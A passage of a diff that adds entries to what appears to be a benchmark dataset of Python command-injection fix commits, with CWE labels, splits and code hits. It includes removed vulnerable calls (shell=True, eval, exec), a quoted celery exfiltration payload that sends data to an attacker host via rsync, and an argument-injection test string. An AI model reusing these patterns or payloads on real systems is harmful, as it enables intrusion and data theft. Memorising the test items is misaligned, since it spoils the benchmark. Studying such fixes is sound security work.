+      "pair_id": "pyvul-jupyterhub-binderhub-195caac17269",
+      "split": "held_out",
+      "cwe": "CWE-78",
+      "repository": "jupyterhub/binderhub",
+      "fix_commit": "195caac172690456dcdc8cc7a6ca50e05abf8182",
+      "commit": {
+        "url": "https://github.com/jupyterhub/binderhub/commit/195caac172690456dcdc8cc7a6ca50e05abf8182",
+        "message": "Explicitly separate git-ls-remote options from positional arguments",
+        "files": [
+          {
+            "file": "binderhub/repoproviders.py",
+            "hits": [
+              "             # The ref is a head/tag and we resolve it using `git ls-remote`",
+              "-            command = [\"git\", \"ls-remote\", self.repo, self.unresolved_ref]",
+              "+            command = [\"git\", \"ls-remote\", \"--\", self.repo, self.unresolved_ref]",
+              "             result = subprocess.run(command, universal_newlines=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)",
+              "                 raise RuntimeError(\"Unable to run git ls-remote to get the `resolved_ref`: {}\".format(result.stderr))"
+            ]
+          }
+        ],
+        "all_files": [
+          "binderhub/repoproviders.py"
+        ]
+      }
+    },
+    {
+      "group_id": "pyvul:paddlepaddle/paddle",
+      "pair_id": "pyvul-PaddlePaddle-Paddle-c5f6862d118d",
+      "split": "development",
+      "cwe": "CWE-78",
+      "repository": "PaddlePaddle/Paddle",
+      "fix_commit": "c5f6862d118d7d69210f0e73bea1b055f5f21f2b",
+      "commit": {
+        "url": "https://github.com/PaddlePaddle/Paddle/commit/c5f6862d118d7d69210f0e73bea1b055f5f21f2b",
+        "message": "fix wget download (#59957)\n\n* fix wget download\r\n\r\n* fix wget",
+        "files": [
+          {
+            "file": "python/paddle/utils/download.py",
+            "hits": [
+              "+from urllib.parse import urlparse",
+              "@@ -196,22 +197,31 @@ def _get_download(url, fullname):",
+              "-def _wget_download(url, fullname):",
+              "-    # using wget to download url",
+              "-    command = f'wget -O {tmp_fullname} -t {DOWNLOAD_RETRY_LIMIT} {url}'",
+              "-    subprc = subprocess.Popen(",
+              "-        command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE",
+              "-            f'{command} failed. Please make sure `wget` is installed or {url} exists'",
+              "+def _wget_download(url: str, fullname: str):",
+              "+        assert urlparse(url).scheme in (",
+              "+        ), 'Only support https and http url'",
+              "+        # using wget to download url",
+              "+        command = f'wget -O {tmp_fullname} -t {DOWNLOAD_RETRY_LIMIT} {url}'",
+              "+        subprc = subprocess.Popen(",
+              "+            command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE",
+              "+                f'{command} failed. Please make sure `wget` is installed or {url} exists'",
+              "+        logger.info(f\"Downloading {url} failed with exception {str(e)}\")"
+            ]
+          }
+        ],
+        "all_files": [
+          "python/paddle/utils/download.py"
+        ]
+      }
+    },
+    {
+      "group_id": "pyvul:paddlepaddle/paddle",
+      "pair_id": "pyvul-PaddlePaddle-Paddle-49bec1760535",
+      "split": "development",
+      "cwe": "CWE-78",
+      "repository": "PaddlePaddle/Paddle",
+      "fix_commit": "49bec176053595975c1941cff9749c55f7203ea9",
+      "commit": {
+        "url": "https://github.com/PaddlePaddle/Paddle/commit/49bec176053595975c1941cff9749c55f7203ea9",
+        "message": "fix fleetutil get_online_pass_interval bug (#60023)",
+        "files": [
+          {
+            "file": "python/paddle/incubate/distributed/fleet/fleet_util.py",
+            "hits": [
+              "                 ...     is_data_hourly_placed=False)",
+              "         days = os.popen(\"echo -n \" + days).read().split(\" \")",
+              "         hours = os.popen(\"echo -n \" + hours).read().split(\" \")"
+            ]
+          }
+        ],
+        "all_files": [
+          "python/paddle/incubate/distributed/fleet/fleet_util.py"
+        ]
+      }
+    },
+    {
+      "group_id": "pyvul:paddlepaddle/paddle",
+      "pair_id": "pyvul-PaddlePaddle-Paddle-5ed9478fdef9",
+      "split": "development",
+      "cwe": "CWE-78",
+      "repository": "PaddlePaddle/Paddle",
+      "fix_commit": "5ed9478fdef96a06eeec9093f9e768c97b094af3",
+      "commit": {
+        "url": "https://github.com/PaddlePaddle/Paddle/commit/5ed9478fdef96a06eeec9093f9e768c97b094af3",
+        "message": "[Dy2St]Fix BUG with Potential security vulnerabilities (#60097)",
+        "files": [
+          {
+            "file": "python/paddle/jit/dy2static/convert_operators.py",
+            "hits": [
+              "-            element_wise_result = eval(\"x \" + op_str + \" y\")",
+              "-            cur_result = eval(\"cmp_left \" + cmp_op + \" cmp_right\")"
+            ]
+          }
+        ],
+        "all_files": [
+          "python/paddle/jit/dy2static/__init__.py",
+          "python/paddle/jit/dy2static/convert_operators.py",
+          "test/dygraph_to_static/test_convert_operators.py"
+        ]
+      }
+    },
+    {
+      "group_id": "pyvul:yt-dlp/yt-dlp",
+      "pair_id": "pyvul-yt-dlp-yt-dlp-de015e930747",
+      "split": "development",
+      "cwe": "CWE-78",
+      "repository": "yt-dlp/yt-dlp",
+      "fix_commit": "de015e930747165dbb8fcd360f8775fd973b7d6e",
+      "commit": {
+        "url": "https://github.com/yt-dlp/yt-dlp/commit/de015e930747165dbb8fcd360f8775fd973b7d6e",
+        "message": "[core] Prevent RCE when using `--exec` with `%q` (CVE-2023-40581)\n\nThe shell escape function is now using `\"\"` instead of `\\\"`. `utils.Popen` has been patched to properly quote commands.\n\nPrior to this fix using `--exec` together with `%q` when on Windows could cause remote code to execute. See https://github.com/yt-dlp/yt-dlp/security/advisories/GHSA-42h4-v29r-42qg for reference.\n\nAuthored by: Grub4K",
+        "files": [
+          {
+            "file": "devscripts/changelog_override.json",
+            "hits": [
+              "+        \"short\": \"[priority] Security: [[CVE-2023-40581](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-40581)] [Prevent RCE when using `--exec` with `%q` on Windows](https://github.com/yt-dlp/yt-dlp/security/advisories/GHSA-42h4-v29r-42qg)\\n    - The shell escape function is now using `\\\"\\\"` instead of `\\\\\\\"`.\\n    - `utils.Popen` has been patched to properly quote commands.\""
+            ]
+          },
+          {
+            "file": "test/test_utils.py",
+            "hits": [
+              "+import subprocess",
+              "+    Popen,",
+              "     base_url,",
+              "+    def test_Popen_windows_escaping(self):",
+              "+            stdout, stderr, error = Popen.run(",
+              "+                args, text=True, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)"
+            ]
+          },
+          {
+            "file": "yt_dlp/compat/__init__.py",
+            "hits": [
+              "     def compat_shlex_quote(s):",
+              "     from shlex import quote as compat_shlex_quote  # noqa: F401"
+            ]
+          },
+          {
+            "file": "yt_dlp/postprocessor/exec.py",
+            "hits": [
+              "-import subprocess",
+              " from ..compat import compat_shlex_quote",
+              "+from ..utils import Popen, PostProcessingError, variadic",
+              "@@ -27,10 +25,10 @@ def parse_cmd(self, cmd, info):",
+              "         for tmpl in self.exec_cmd:",
+              "             cmd = self.parse_cmd(tmpl, info)",
+              "-            self.to_screen('Executing command: %s' % cmd)",
+              "-            retCode = subprocess.call(encodeArgument(cmd), shell=True)",
+              "-                raise PostProcessingError('Command returned error code %d' % retCode)",
+              "+            self.to_screen(f'Executing command: {cmd}')",
+              "+            _, _, return_code = Popen.run(cmd, shell=True)",
+              "+                raise PostProcessingError(f'Command returned error code {return_code}')"
+            ]
+          },
+          {
+            "file": "yt_dlp/utils/_utils.py",
+            "hits": [
+              "+    def __init__(self, args, *remaining, env=None, text=False, shell=False, **kwargs):",
+              "+                args = ' '.join(compat_shlex_quote(a) for a in args)",
+              "+            shell = False",
+              "+        super().__init__(args, *remaining, env=env, shell=shell, **kwargs, startupinfo=self._startupinfo)",
+              "+            os.environ.get('SystemRoot', ''), 'System32', 'cmd.exe')"
+            ]
+          }
+        ],
+        "all_files": [
+          "devscripts/changelog_override.json",
+          "test/test_YoutubeDL.py",
+          "test/test_utils.py",
+          "yt_dlp/compat/__init__.py",
+          "yt_dlp/postprocessor/exec.py",
+          "yt_dlp/utils/_utils.py"
+        ]
+      }
+    },
+    {
+      "group_id": "pyvul:mlflow/mlflow",
+      "pair_id": "pyvul-mlflow-mlflow-6dde93758d42",
+      "split": "held_out",
+      "cwe": "CWE-78",
+      "repository": "mlflow/mlflow",
+      "fix_commit": "6dde93758d42455cb90ef324407919ed67668b9b",
+      "commit": {
+        "url": "https://github.com/mlflow/mlflow/commit/6dde93758d42455cb90ef324407919ed67668b9b",
+        "message": "Fix potential issues with PyFuncBackend in cli (#9053)\n\nSigned-off-by: Serena Ruan <serena.rxy@gmail.com>",
+        "files": [
+          {
+            "file": "mlflow/pyfunc/_mlflow_pyfunc_backend_predict.py",
+            "hits": [
+              "+This script should be executed in a fresh python interpreter process using `subprocess`."
+            ]
+          },
+          {
+            "file": "mlflow/pyfunc/backend.py",
+            "hits": [
+              " import subprocess",
+              "+import shlex",
+              "-            command = (",
+              "-            return self.prepare_env(local_path).execute(command)",
+              "+            predict_cmd = [",
+              "+                shlex.quote(str(content_type)),",
+              "+                predict_cmd += [\"--input-path\", shlex.quote(str(input_path))]",
+              "+                predict_cmd += [\"--output-path\", shlex.quote(str(output_path))]",
+              "+            return self.prepare_env(local_path).execute(\" \".join(predict_cmd))"
+            ]
+          },
+          {
+            "file": "mlflow/pyfunc/scoring_server/__init__.py",
+            "hits": [
+              "+import shlex",
+              "@@ -328,14 +330,16 @@ def get_cmd(",
+              "+            address = shlex.quote(f\"{host}:{port}\")",
+              "+            args.append(f\"-b {shlex.quote(host)}\")",
+              "@@ -347,7 +351,7 @@ def get_cmd(",
+              "+            args.append(f\"--host={shlex.quote(host)}\")"
+            ]
+          },
+          {
+            "file": "tests/models/test_cli.py",
+            "hits": [
+              "+from mlflow.utils.process import ShellCommandException",
+              "+    prc = subprocess.run(",
+              "+        stdout=subprocess.PIPE,",
+              "+        stderr=subprocess.PIPE,",
+              "+    prc = subprocess.run(",
+              "+        stdout=subprocess.PIPE,",
+              "+        stderr=subprocess.PIPE,",
+              "+    prc = subprocess.run(",
+              "+        stdout=subprocess.PIPE,",
+              "+        stderr=subprocess.PIPE,",
+              "+    prc = subprocess.run(",
+              "+        stdout=subprocess.PIPE,",
+              "+        stderr=subprocess.PIPE,",
+              "+    prc = subprocess.run(",
+              "+        stdout=subprocess.PIPE,",
+              "+        stderr=subprocess.PIPE,",
+              "+        with pytest.raises(ShellCommandException, match=r\"Non-zero exit code: 1\"):"
+            ]
+          }
+        ],
+        "all_files": [
+          "mlflow/pyfunc/_mlflow_pyfunc_backend_predict.py",
+          "mlflow/pyfunc/backend.py",
+          "mlflow/pyfunc/scoring_server/__init__.py",
+          "tests/models/test_cli.py"
+        ]
+      }
+    },
+    {
+      "group_id": "pyvul:langchain-ai/langchain",
+      "pair_id": "pyvul-langchain-ai-langchain-a2f191a32229",
+      "split": "development",
+      "cwe": "CWE-78",
+      "repository": "langchain-ai/langchain",
+      "fix_commit": "a2f191a32229256dd41deadf97786fe41ce04cbb",
+      "commit": {
+        "url": "https://github.com/langchain-ai/langchain/commit/a2f191a32229256dd41deadf97786fe41ce04cbb",
+        "message": "Replace JIRA Arbitrary Code Execution vulnerability with finer grain API wrapper (#6992)\n\nThis fixes #4833 and the critical vulnerability\r\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-34540\r\n\r\nPreviously, the JIRA API Wrapper had a mode that simply pipelined user\r\ninput into an `exec()` function.\r\n[The intended use of the 'other' mode is to cover any of Atlassian's API\r\nthat don't have an existing\r\ninterface](https://github.com/hwchase17/langchain/blob/cc33bde74ff2e050a400e4451e04ff5b32c4a7bd/langchain/tools/jira/prompt.py#L24)\r\n\r\nFortunately all of the [Atlassian JIRA API methods are subfunctions of\r\ntheir `Jira`\r\nclass](https://atlassian-python-api.readthedocs.io/jira.html), so this\r\nimplementation calls these subfunctions directly.\r\n\r\nAs well as passing a string representation of the function to call, the\r\nimplementation flexibly allows for optionally passing args and/or\r\nkeyword-args. These are given as part of the dictionary input. Example:\r\n```\r\n    {\r\n        \"function\": \"update_issue_field\",   #function to execute\r\n        \"args\": [                           #list of ordered args similar to other examples in this JiraAPIWrapper\r\n            \"key\",\r\n            {\"summary\": \"New summary\"}\r\n        ],\r\n        \"kwargs\": {}                        #dict of key value keyword-args pairs\r\n    }\r\n```\r\n\r\nthe above is equivalent to `self.jira.update_issue_field(\"key\",\r\n{\"summary\": \"New summary\"})`\r\n\r\nAlternate query schema designs are welcome to make querying easier\r\nwithout passing and evaluating arbitrary python code. I considered\r\nparsing (without evaluating) input python code and extracting the\r\nfunction, args, and kwargs from there and then pipelining them into the\r\ncallable function via `*f(args, **kwargs)` - but this seemed more\r\ndirect.\r\n\r\n@vowelparrot @dev2049\r\n\r\n---",
+        "files": [
+          {
+            "file": "langchain/utilities/jira.py",
+            "hits": [
+              "-        exec(f\"result = {query}\", context)"
+            ]
+          }
+        ],
+        "all_files": [
+          "langchain/tools/jira/prompt.py",
+          "langchain/utilities/jira.py",
+          "tests/integration_tests/utilities/test_jira_api.py"
+        ]
+      }
+    },
+    {
+      "group_id": "pyvul:dwisiswant0/apkleaks",
+      "pair_id": "pyvul-dwisiswant0-apkleaks-a966e781499f",
+      "split": "development",
+      "cwe": "CWE-88",
+      "repository": "dwisiswant0/apkleaks",
+      "fix_commit": "a966e781499ff6fd4eea66876d7532301b13a382",
+      "commit": {
+        "url": "https://github.com/dwisiswant0/apkleaks/commit/a966e781499ff6fd4eea66876d7532301b13a382",
+        "message": "Escapes decompiling arguments",
+        "files": [
+          {
+            "file": "apkleaks/apkleaks.py",
+            "hits": [
+              " from distutils.spawn import find_executable",
+              " from urllib.request import urlopen",
+              "-\t\tos.system(dec)",
+              "+\t\tos.system(comm)"
+            ]
+          }
+        ],
+        "all_files": [
+          "apkleaks/apkleaks.py"
+        ]
+      }
+    },
+    {
+      "group_id": "pyvul:celery/celery",
+      "pair_id": "pyvul-celery-celery-1f7ad7e6df1e",
+      "split": "development",
+      "cwe": "CWE-77",
+      "repository": "celery/celery",
+      "fix_commit": "1f7ad7e6df1e02039b6ab9eec617d283598cad6b",
+      "commit": {
+        "url": "https://github.com/celery/celery/commit/1f7ad7e6df1e02039b6ab9eec617d283598cad6b",
+        "message": "Fix CVE-2021-23727 (Stored Command Injection securtiy vulnerability).\n\nWhen a task fails, the failure information is serialized in the backend.\nIn some cases, the exception class is only importable from the\nconsumer's code base. In this case, we reconstruct the exception class\nso that we can re-raise the error on the process which queried the\ntask's result. This was introduced in #4836.\nIf the recreated exception type isn't an exception, this is a security issue.\nWithout the condition included in this patch, an attacker could inject a remote code execution instruction such as:\n`os.system(\"rsync /data attacker@192.168.56.100:~/data\")`\nby setting the task's result to a failure in the result backend with the os,\nthe system function as the exception type and the payload `rsync /data attacker@192.168.56.100:~/data` as the exception arguments like so:\n```json\n{\n      \"exc_module\": \"os\",\n      'exc_type': \"system\",\n      \"exc_message\": \"rsync /data attacker@192.168.56.100:~/data\"\n}\n```\n\nAccording to my analysis, this vulnerability can only be exploited if\nthe producer delayed a task which runs long enough for the\nattacker to change the result mid-flight, and the producer has\npolled for the tasks's result.\nThe attacker would also have to gain access to the result backend.\nThe severity of this security vulnerability is low, but we still\nrecommend upgrading.",
+        "files": [
+          {
+            "file": "celery/backends/base.py",
+            "hits": [
+              "                 exc = get_pickled_exception(exc)",
+              "+        # could exploit a stored command vulnerability to execute arbitrary",
+              "+        # os.system(\"rsync /data attacker@192.168.56.100:~/data\")",
+              "+        #      cls could be anything, even eval()."
+            ]
+          },
+          {
+            "file": "t/unit/backends/test_base.py",
+            "hits": [
+              "+                           match=re.escape(r\"Expected an exception class, got os.system with payload ('echo 1',)\")):"
+            ]
+          }
+        ],
+        "all_files": [
+          "celery/backends/base.py",
+          "t/unit/backends/test_base.py"
+        ]
+      }
+    },
+    {
+      "group_id": "pyvul:mlflow/mlflow",
+      "pair_id": "pyvul-mlflow-mlflow-a98a341a7222",
+      "split": "held_out",
+      "cwe": "CWE-77",
+      "repository": "mlflow/mlflow",
+      "fix_commit": "a98a341a7222f894b7735db575ad9311ecaba4e3",
+      "commit": {
+        "url": "https://github.com/mlflow/mlflow/commit/a98a341a7222f894b7735db575ad9311ecaba4e3",
+        "message": "Add sandboxed jinja2 loader for yaml rendering (#10676)\n\nSigned-off-by: Ben Wilson <benjamin.wilson@databricks.com>",
+        "files": [
+          {
+            "file": "mlflow/utils/file_utils.py",
+            "hits": [
+              "@@ -329,7 +329,8 @@ def render_and_merge_yaml(root, template_name, context_name):",
+              "-    import jinja2",
+              "+    from jinja2 import FileSystemLoader, StrictUndefined",
+              "+    from jinja2.sandbox import SandboxedEnvironment",
+              "     template_path = os.path.join(root, template_name)",
+              "@@ -338,9 +339,9 @@ def render_and_merge_yaml(root, template_name, context_name):",
+              "-    j2_env = jinja2.Environment(",
+              "-        loader=jinja2.FileSystemLoader(root, encoding=ENCODING),",
+              "-        undefined=jinja2.StrictUndefined,"
+            ]
+          }
+        ],
+        "all_files": [
+          "mlflow/utils/file_utils.py"
+        ]
+      }
+    },
+    {
+      "group_id": "pyvul:pypa/pip",
+      "pair_id": "pyvul-pypa-pip-389cb799d0da",
+      "split": "development",
+      "cwe": "CWE-77",
+      "repository": "pypa/pip",
+      "fix_commit": "389cb799d0da9a840749fcd14878928467ed49b4",
+      "commit": {
+        "url": "https://github.com/pypa/pip/commit/389cb799d0da9a840749fcd14878928467ed49b4",
+        "message": "Use `-r=...` instead of `-r ...` for hg\n\nThis ensures that the resulting revision can not be misinterpreted as an\noption.",
+        "files": [
+          {
+            "file": "src/pip/_internal/vcs/mercurial.py",
+            "hits": [
+              "         self, dest: str, url: HiddenText, rev_options: RevOptions, verbosity: int"
+            ]
+          }
+        ],
+        "all_files": [
+          "src/pip/_internal/vcs/mercurial.py",
+          "tests/unit/test_vcs.py"
+        ]
+      }
+    },
+    {
+      "group_id": "pyvul:dgilland/pydash",
+      "pair_id": "pyvul-dgilland-pydash-6ff0831ad285",
+      "split": "development",
+      "cwe": "CWE-78",
+      "repository": "dgilland/pydash",
+      "fix_commit": "6ff0831ad285fff937cafd2a853f20cc9ae92021",
+      "commit": {
+        "url": "https://github.com/dgilland/pydash/commit/6ff0831ad285fff937cafd2a853f20cc9ae92021",
+        "message": "fix: don't allow object paths that reference dunder-method attributes for functions like get()",
+        "files": [],
+        "all_files": [
+          "src/pydash/helpers.py",
+          "tests/test_objects.py"
+        ]
+      }
+    },
+    {
+      "group_id": "pyvul:nexb/scancode.io",
+      "pair_id": "pyvul-nexB-scancode.io-07ec0de1964b",
+      "split": "development",
+      "cwe": "CWE-77",
+      "repository": "nexB/scancode.io",
+      "fix_commit": "07ec0de1964b14bf085a1c9a27ece2b61ab6105c",
+      "commit": {
+        "url": "https://github.com/aboutcode-org/scancode.io/commit/07ec0de1964b14bf085a1c9a27ece2b61ab6105c",
+        "message": "Merge pull request from GHSA-2ggp-cmvm-f62f\n\n- Regex that validates docker_reference variable\n- Securing against possible command injection",
+        "files": [
+          {
+            "file": "scanpipe/pipes/__init__.py",
+            "hits": [
+              "@@ -278,7 +278,7 @@ def run_command(cmd, log_output=False):",
+              "     process = subprocess.Popen(",
+              "         cmd,",
+              "-        shell=True,",
+              "+        shell=False,",
+              "         stdout=subprocess.PIPE,",
+              "         stderr=subprocess.STDOUT,"
+            ]
+          }
+        ],
+        "all_files": [
+          "scanpipe/pipes/__init__.py",
+          "scanpipe/pipes/fetch.py"
+        ]
+      }
+    },
+    {
+      "group_id": "pyvul:snowflakedb/snowflake-connector-python",
+      "pair_id": "pyvul-snowflakedb-snowflake-connector-python-1cdbd3b1403c",
+      "split": "held_out",
+      "cwe": "CWE-77",
+      "repository": "snowflakedb/snowflake-connector-python",
+      "fix_commit": "1cdbd3b1403c5ef520d7f4d9614fe35165e101ac",
+      "commit": {
+        "url": "https://github.com/snowflakedb/snowflake-connector-python/commit/1cdbd3b1403c5ef520d7f4d9614fe35165e101ac",
+        "message": "SNOW-761004 Added URL Validator and URL escaping of strings (#1480)",
+        "files": [
+          {
+            "file": ".pre-commit-config.yaml",
+            "hits": [
+              "+                | url_util"
+            ]
+          },
+          {
+            "file": "DESCRIPTION.md",
+            "hits": [
+              "   - Fixed a bug where the `put` command on AWS raised `AttributeError` when the file size was larger than 200M.",
+              "+  - Validate SSO URL before opening it in the browser for External browser authenticator."
+            ]
+          },
+          {
+            "file": "src/snowflake/connector/auth/webbrowser.py",
+            "hits": [
+              "     ER_UNABLE_TO_OPEN_BROWSER,",
+              "     EXTERNAL_BROWSER_AUTHENTICATOR,",
+              "+from ..url_util import is_valid_url",
+              "+            logger.debug(\"step 1: query GS to obtain SSO url\")",
+              "+            sso_url = self._get_sso_url(",
+              "+            logger.debug(\"Validate SSO URL\")",
+              "+            if not is_valid_url(sso_url):",
+              "+                        \"message\": (f\"The SSO URL provided {sso_url} is invalid\"),",
+              "                 \"browser window should have opened for you to complete the \"",
+              "                 \"login. If you can't see it, check existing browser windows, \"",
+              "-            logger.debug(\"step 1: query GS to obtain SSO url\")",
+              "-            sso_url = self._get_sso_url(",
+              "             logger.debug(\"step 2: open a browser\")",
+              "             print(f\"Going to open: {sso_url} to authenticate...\")",
+              "             if not self._webbrowser.open_new(sso_url):"
+            ]
+          },
+          {
+            "file": "src/snowflake/connector/url_util.py",
+            "hits": [
+              "+import urllib.parse",
+              "+URL_VALIDATOR = re.compile(",
+              "+def is_valid_url(url: str) -> bool:",
+              "+    \"\"\"Confirms if the provided URL is a valid HTTP/ HTTPs URL",
+              "+        url: the URL that needs to be validated",
+              "+        true/ false depending on whether the URL is valid or not",
+              "+    return bool(URL_VALIDATOR.match(url))",
+              "+def url_encode_str(target: str | None) -> str:",
+              "+    \"\"\"Converts a target string into escaped URL safe string",
+              "+        target: string to be URL encoded",
+              "+        URL encoded string",
+              "+        logger.debug(\"The string to be URL encoded is None\")",
+              "+    return urllib.parse.quote_plus(target, safe=\"\")"
+            ]
+          },
+          {
+            "file": "test/unit/test_auth_webbrowser.py",
+            "hits": [
+              " REF_SSO_URL = \"https://testsso.snowflake.net/sso\"",
+              "+INVALID_SSO_URL = \"this is an invalid URL\"",
+              "+def test_auth_webbrowser_invalid_sso(monkeypatch):",
+              "+    \"\"\"Authentication by WebBrowser with failed to start web browser case.\"\"\"",
+              "+    rest = _init_rest(INVALID_SSO_URL, REF_PROOF_KEY)",
+              "+    # mock webbrowser",
+              "+    mock_webbrowser = MagicMock()",
+              "+    mock_webbrowser.open_new.return_value = False",
+              "+    auth = AuthByWebBrowser(",
+              "+        webbrowser_pkg=mock_webbrowser,"
+            ]
+          },
+          {
+            "file": "test/unit/test_url_util.py",
+            "hits": [
+              "+    from snowflake.connector.url_util import is_valid_url, url_encode_str",
+              "+    def is_valid_url(s):",
+              "+def test_url_validator():",
+              "+    assert is_valid_url(\"https://ssoTestURL.okta.com\")",
+              "+    assert is_valid_url(\"https://ssoTestURL.okta.com:8080\")",
+              "+    assert is_valid_url(\"https://ssoTestURL.okta.com/testpathvalue\")",
+              "+    assert not is_valid_url(\"-a Calculator\")",
+              "+    assert not is_valid_url(\"This is a random text\")",
+              "+    assert not is_valid_url(\"file://TestForFile\")",
+              "+    assert url_encode_str(\"Hello @World\") == \"Hello+%40World\"",
+              "+    assert url_encode_str(\"Test//String\") == \"Test%2F%2FString\"",
+              "+    assert url_encode_str(None) == \"\""
+            ]
+          }
+        ],
+        "all_files": [
+          ".pre-commit-config.yaml",
+          "DESCRIPTION.md",
+          "setup.py",
+          "src/snowflake/connector/auth/webbrowser.py",
+          "src/snowflake/connector/snow_logging.py",
+          "src/snowflake/connector/url_util.py",
+          "test/unit/test_auth_webbrowser.py",
+          "test/unit/test_url_util.py"
+        ]
+      }
+    },
+    {
+      "group_id": "pyvul:pytorch/pytorch",
+      "pair_id": "pyvul-pytorch-pytorch-767f6aa49fe2",
+      "split": "held_out",
+      "cwe": "CWE-77",
+      "repository": "pytorch/pytorch",
+      "fix_commit": "767f6aa49fe20a2766b9843d01e3b7f7793df6a3",
+      "commit": {
+        "url": "https://github.com/pytorch/pytorch/commit/767f6aa49fe20a2766b9843d01e3b7f7793df6a3",
+        "message": "[JIT][Security] Do not blindly eval input string (#89189)\n\nIntroduce `_eval_no_call` method, that evaluates statement only if it\ndoes not contain any calls(done by examining the bytecode), thus preventing command injection exploit\n\nAdded simple unit test to check for that\n`torch.jit.annotations.get_signature` would not result in calling random\ncode.\n\nAlthough, this code path exists for Python-2 compatibility, and perhaps\nshould be simply removed.\n\nFixes https://github.com/pytorch/pytorch/issues/88868\n\nPull Request resolved: https://github.com/pytorch/pytorch/pull/89189\nApproved by: https://github.com/suo",
+        "files": [
+          {
+            "file": "torch/jit/annotations.py",
+            "hits": [
+              "+    return eval(bytecode, glob, loc)  # type: ignore[arg-type] # noqa: P204",
+              "-        arg_ann = eval(arg_ann_str, {}, EvalEnv(rcb))  # type: ignore[arg-type] # noqa: P204",
+              "-        ret_ann = eval(ret_ann_str, {}, EvalEnv(rcb))  # type: ignore[arg-type] # noqa: P204"
+            ]
+          }
+        ],
+        "all_files": [
+          "test/test_jit.py",
+          "torch/csrc/jit/frontend/script_type_parser.cpp",
+          "torch/jit/annotations.py"
+        ]
+      }
+    },
+    {
+      "group_id": "pyvul:weblateorg/weblate",
+      "pair_id": "pyvul-WeblateOrg-weblate-35d59f1f0405",
+      "split": "held_out",
+      "cwe": "CWE-88",
+      "repository": "WeblateOrg/weblate",
+      "fix_commit": "35d59f1f040541c358cece0a8d4a63183ca919b8",
+      "commit": {
+        "url": "https://github.com/WeblateOrg/weblate/commit/35d59f1f040541c358cece0a8d4a63183ca919b8",
+        "message": "vcs: Improve mercurial parameters handling\n\nMake sure that all user provided input is handled as expected.",
+        "files": [
+          {
+            "file": "weblate/vcs/mercurial.py",
+            "hits": [
+              "-        cls._popen([\"clone\", \"--branch\", branch, source, target])",
+              "+        cls._popen([\"clone\", f\"--branch={branch}\", \"--\", source, target])"
+            ]
+          }
+        ],
+        "all_files": [
+          "weblate/vcs/mercurial.py"
+        ]
+      }
+    },
+    {
+      "group_id": "pyvul:weblateorg/weblate",
+      "pair_id": "pyvul-WeblateOrg-weblate-d83672a3e741",
+      "split": "held_out",
+      "cwe": "CWE-88",
+      "repository": "WeblateOrg/weblate",
+      "fix_commit": "d83672a3e7415da1490334e2c9431e5da1966842",
+      "commit": {
+        "url": "https://github.com/WeblateOrg/weblate/commit/d83672a3e7415da1490334e2c9431e5da1966842",
+        "message": "vcs: Improve git parameters handling\n\nMake sure that all user provided input is handled as expected.",
+        "files": [
+          {
+            "file": "weblate/vcs/git.py",
+            "hits": [
+              "-            result = cls._popen([\"ls-remote\", \"--symref\", repo, \"HEAD\"])",
+              "+            result = cls._popen([\"ls-remote\", \"--symref\", \"--\", repo, \"HEAD\"])",
+              "-        cls._popen([\"clone\"] + cls.get_depth() + [\"--branch\", branch, source, target])",
+              "+        cls._popen(",
+              "@@ -572,7 +574,7 @@ def get_last_repo_revision(cls, url):"
+            ]
+          }
+        ],
+        "all_files": [
+          "weblate/vcs/git.py"
+        ]
+      }
+    },
+    {
+      "group_id": "pyvul:tankywoo/simiki",
+      "pair_id": "pyvul-tankywoo-simiki-45da0ab7c1e9",
+      "split": "held_out",
+      "cwe": "CWE-77",
+      "repository": "tankywoo/simiki",
+      "fix_commit": "45da0ab7c1e94b368cac22867e7ac9a42dbb9390",
+      "commit": {
+        "url": "https://github.com/tankywoo/simiki/commit/45da0ab7c1e94b368cac22867e7ac9a42dbb9390",
+        "message": "Fix pyyaml CVE-2017-18342",
+        "files": [
+          {
+            "file": "requirements.txt",
+            "hits": [
+              " Jinja2==2.7.3"
+            ]
+          },
+          {
+            "file": "simiki/config.py",
+            "hits": [
+              "-        config = yaml.load(fd)",
+              "+        config = yaml.load(fd, Loader=yaml.FullLoader)"
+            ]
+          },
+          {
+            "file": "simiki/generators.py",
+            "hits": [
+              "-            meta = yaml.load(yaml_str)",
+              "+            meta = yaml.load(yaml_str, Loader=yaml.FullLoader)"
+            ]
+          }
+        ],
+        "all_files": [
+          "requirements.txt",
+          "simiki/config.py",
+          "simiki/generators.py"
+        ]
+      }
+    },
+    {
+      "group_id": "pyvul:ansible/ansible",
+      "pair_id": "pyvul-ansible-ansible-35938b907dfc",
+      "split": "development",
+      "cwe": "CWE-77",
+      "repository": "ansible/ansible",
+      "fix_commit": "35938b907dfcd1106ca40b794f0db446bdb8cf09",
+      "commit": {
+        "url": "https://github.com/ansible/ansible/commit/35938b907dfcd1106ca40b794f0db446bdb8cf09",
+        "message": "Filter out internal magic and connection variables from facts returns\n\nFixes #15925\n\n(cherry picked from commit f826370ab8befacf2e8867ee3d7e2b814a3da385)",
+        "files": [
+          {
+            "file": "lib/ansible/plugins/action/__init__.py",
+            "hits": [
+              "+            if 'ansible_facts' in data and isinstance(data['ansible_facts'], dict):",
+              "+                fact_keys = set(data['ansible_facts'].keys())",
+              "+                # keys we want to remove from facts",
+              "+                        del data['ansible_facts'][r_key]"
+            ]
+          }
+        ],
+        "all_files": [
+          "lib/ansible/plugins/__init__.py",
+          "lib/ansible/plugins/action/__init__.py"
+        ]
+      }
+    },
+    {
+      "group_id": "pyvul:apache/airflow",
+      "pair_id": "pyvul-apache-airflow-2844dad1c762",
+      "split": "development",
+      "cwe": "CWE-88",
+      "repository": "apache/airflow",
+      "fix_commit": "2844dad1c762f5c7dd1271866d3661bf66657300",
+      "commit": {
+        "url": "https://github.com/apache/airflow/commit/2844dad1c762f5c7dd1271866d3661bf66657300",
+        "message": "Disable setting ODBC driver via extra by default (#31713)\n\nBy default setting driver via extra is disabled by default but we\r\nhave several more ways to set it.",
+        "files": [
+          {
+            "file": "tests/providers/odbc/hooks/test_odbc.py",
+            "hits": [
+              " from urllib.parse import quote_plus, urlsplit"
+            ]
+          }
+        ],
+        "all_files": [
+          "airflow/providers/odbc/CHANGELOG.rst",
+          "airflow/providers/odbc/hooks/odbc.py",
+          "tests/providers/odbc/hooks/test_odbc.py"
